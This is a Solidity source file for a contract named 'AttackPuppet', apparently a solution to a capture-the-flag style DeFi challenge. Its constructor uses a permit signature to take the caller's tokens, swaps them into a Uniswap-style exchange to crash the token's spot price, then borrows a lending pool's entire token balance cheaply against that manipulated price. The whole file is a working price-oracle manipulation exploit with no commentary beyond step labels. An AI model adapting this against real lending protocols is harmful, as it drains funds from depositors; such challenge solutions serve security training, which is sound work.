// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract AttackPuppet {
    using Address for address;

    uint private constant POOL_INITIAL_TOKEN_BALANCE = 100000 * 10 ** 18;

    constructor(
        address tokenAddress,
        address poolAddress,
        address swapAddress,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        (, bytes memory data) = tokenAddress.staticcall(
            abi.encodeWithSignature("balanceOf(address)", msg.sender)
        );

        uint tokenAmount = abi.decode(data, (uint256));
        uint deadline = type(uint).max;
        //permit to attackContract
        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
                msg.sender,
                address(this),
                tokenAmount,
                deadline,
                v,
                r,
                s
            )
        );
        //transfer to attackContract
        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                msg.sender,
                address(this),
                tokenAmount
            )
        );
        //approve to uniswap
        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                swapAddress,
                type(uint256).max
            )
        );
        //swap
        swapAddress.functionCall(
            abi.encodeWithSignature(
                "tokenToEthSwapInput(uint256,uint256,uint256)",
                tokenAmount,
                1,
                deadline
            )
        );
        //borrow
        poolAddress.functionCallWithValue(
            abi.encodeWithSignature(
                "borrow(uint256,address)",
                POOL_INITIAL_TOKEN_BALANCE,
                msg.sender
            ),
            msg.value
        );
    }
}
